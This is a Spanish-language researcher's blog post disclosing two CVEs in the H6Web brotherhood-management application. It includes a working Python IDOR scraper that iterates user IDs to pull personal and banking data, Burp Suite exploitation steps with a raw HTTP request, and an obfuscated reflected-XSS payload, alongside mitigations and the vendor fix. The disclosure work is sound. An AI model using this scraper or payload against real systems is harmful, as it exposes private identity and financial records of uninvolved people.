---
layout: single
title: Análisis de una Vulnerabilidad en H6Web, hackeando la Semana Santa - Mis Primeros CVEs
excerpt: Descubrimiento y análisis de dos vulnerabilidades críticas (IDOR y XSS) en H6Web, resultando en mis primeros CVEs asignados.
date: 2025-02-13
classes: wide
header:
  teaser: /assets/images/CVEs/logo.png
  teaser_home_page: true
  icon: /assets/images/CVEs/logo.png
categories:
  - Review
  - Infosec
  - Vulns
  - Hacking
  - CVE
  - Pentesting
tags:
  - Pentesting Web
  - IDOR
  - Insecure Direct Object Reference
  - Reflected XSS
  - CVE
  - H6Web
---

# Mis Primeros CVEs Hackeando La Semana Santa.

## Introducción

Recientemente, he descubierto una vulnerabilidad de seguridad en la aplicación web H6Web, ampliamente utilizada por Cofradías en España y otras organizaciones similares. Esta vulnerabilidad se clasifica como Insecure Direct Object Reference (IDOR) y permisos inseguros, permitiendo el acceso no autorizado a información confidencial de los usuarios.

Este hallazgo ha sido oficialmente reconocido y se le han asignado dos CVEs (CVE-2025-1270 y CVE-2025-1271), lo que marca un hito importante en mi carrera en ciberseguridad.

## ¿Qué es un CVE?

CVE (Common Vulnerabilities and Exposures) es un identificador único asignado a una vulnerabilidad de seguridad descubierta en software o hardware. Su objetivo es proporcionar un estándar para que investigadores y organizaciones puedan rastrear y referenciar vulnerabilidades de manera uniforme en diversas bases de datos y sistemas de seguridad.

Cada CVE incluye una descripción detallada de la vulnerabilidad, su impacto y posibles soluciones o mitigaciones. Es gestionado por MITRE Corporation en colaboración con la comunidad de seguridad global.


## Detalles del CVE y Enlaces Oficiales

Según ha confirmado INCIBE, se han asignado dos CVE a estas vulnerabilidades en H6Web:

- **CVE-2025-1270**: [Informe de INCIBE](https://www.incibe.es/en/incibe-cert/notices/aviso/multiple-vulnerabilities-anapi-group-h6web)
- **CVE-2025-1271**: [Informe de INCIBE](https://www.incibe.es/en/incibe-cert/notices/aviso/multiple-vulnerabilities-anapi-group-h6web)


## Detalles de la Vulnerabilidad

**Aplicación Afectada**: H6Web
**Tipo de Vulnerabilidad**: Incorrect Access Control / Insecure Permissions (IDOR), Cross-Site Scripting (XSS)
**Tipo de Ataque**: Remoto
**Impacto**: Acceso no autorizado a información sensible de usuarios autenticados y posible inyección de JavaScript

## Descripción Técnica

### CVE-2025-1270: Vulnerabilidad IDOR

Se ha identificado una vulnerabilidad de IDOR en el endpoint:

```
/h6web/ha_datos_hermano.php
```

La aplicación no valida si el usuario autenticado tiene permisos para acceder a los datos asociados con el parámetro `pkrelacionado` en una solicitud POST. Esto permite a un atacante modificar este parámetro y acceder a información de otros usuarios sin restricciones.


### Prueba de Concepto (PoC)

Imagen de la vulnerabilidad:

![PoC](/assets/images/CVEs/poc1.png)


#### Código de Explotación

A continuación, se muestra un exploit básico en Python que demuestra cómo un atacante podría extraer datos de usuarios modificando el valor del parámetro pkrelacionado:

```python
import requests
from bs4 import BeautifulSoup

url = 'https://URL/h6web/ha_datos_hermano.php'

cookies = {
    "PHPSESSID": "be52565aea157fd5a15b654338129b55"
}

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

for i in range(1, 5):  
    data = {
        "pkrelacionado": i
    }
    response = requests.post(url, cookies=cookies, headers=headers, data=data)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        table = soup.find('table', {'class': 'tabla1'})

        if table:
            for row in table.find_all('tr'):
                cells = row.find_all(['td', 'th'])
                cell_text = [cell.get_text(strip=True) for cell in cells]
                print(cell_text)
        else:
            print('NOT FOUND "tabla1"')
    else:
        print(f'HTTP ERROR: {response.status_code}')
```

#### Pasos de Explotación en Burp Suite

Para explotar esta vulnerabilidad utilizando Burp Suite:

1. Interceptar una solicitud válida al endpoint `/h6web/ha_datos_hermano.php`
2. Modificar el valor del parámetro `pkrelacionado` a diferentes números de usuario (era secuencial)
3. Enviar la solicitud y observar la respuesta con datos sensibles de otros usuarios
4. Automatizar la explotación utilizando Burp Intruder para iterar sobre múltiples valores de `pkrelacionado`

- HTTP EXAMPLE:

```
POST /h6web/ha_datos_hermano.php HTTP/2
Host: URL
Cookie: PHPSESSID=dcBd593c29b47b1a0b5c8e8aca9013
Content-Length: 18
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9
Priority: u=0

pkrelacionado=4104

```

### CVE-2025-1271: Cross-Site Scripting (XSS) Reflejado

Existe una vulnerabilidad de XSS Reflejado en el siguiente endpoint:

```
h6web/index.php?mensaje1=<dETAILS%0aopen%0aonToGgle%0a=%0aa=alert,a(99)%20x>
```

Esta vulnerabilidad permite a un atacante inyectar código JavaScript malicioso que puede resultar en:
- Robo de información sensible
- Suplantación de identidad
- Ejecución de acciones no autorizadas

## Datos Expuestos y Prueba de Concepto

### Datos Expuestos

A continuación, se muestra un ejemplo de los datos que pueden ser expuestos a través de esta vulnerabilidad.
| Campo | Valor |
|-------|-------|
| Nº Hermano | [OCULTO] |
| Nº Real | [OCULTO] |
| Nombre | [OCULTO] |
| Apellidos | [OCULTO] |
| Fecha de alta | [OCULTO] |
| Fecha de nacimiento | [OCULTO] |
| NIF | [OCULTO] |
| Domicilio | [OCULTO] |
| Localidad | [OCULTO] |
| Código postal | [OCULTO] |
| Provincia | [OCULTO] |
| Teléfono | [OCULTO] |
| Móvil | [OCULTO] |
| Email | [OCULTO] |
| Pagos pendientes | [OCULTO] |
| Forma de pago | [OCULTO] |
| Cuenta bancaria | [OCULTO] |
| Periodicidad | [OCULTO] |


### Recomendaciones de Seguridad

Para mitigar esta vulnerabilidad, se recomienda implementar las siguientes medidas:

1. **Validación de permisos**: Verificar que el usuario autenticado tiene derechos sobre el recurso solicitado antes de devolver cualquier información.

2. **Uso de autenticación basada en roles (RBAC)**: Implementar un sistema de control de acceso basado en roles para definir claramente quién puede acceder a qué información.

3. **Registro de actividad**: Monitorizar y registrar solicitudes inusuales o sospechosas para detectar intentos de explotación de vulnerabilidades.

4. **Pruebas de seguridad regulares**: Realizar auditorías de código y pruebas de penetración para identificar y corregir vulnerabilidades antes de que puedan ser explotadas.

## Solución

El equipo de Grupo Anapi ha implementado las siguientes medidas:

1. La vulnerabilidad IDOR ha sido completamente deshabilitada
2. La vulnerabilidad XSS ha sido corregida en la última versión
3. Se recomienda a todos los usuarios actualizar a la última versión

## Conclusión

Este hallazgo destaca la importancia de implementar controles de acceso adecuados en las aplicaciones web. La asignación de dos CVEs a estas vulnerabilidades refuerza la necesidad de seguir investigando y reportando problemas de seguridad para hacer de Internet un lugar más seguro.

¡Mis primeros CVEs, y muchos más por venir!
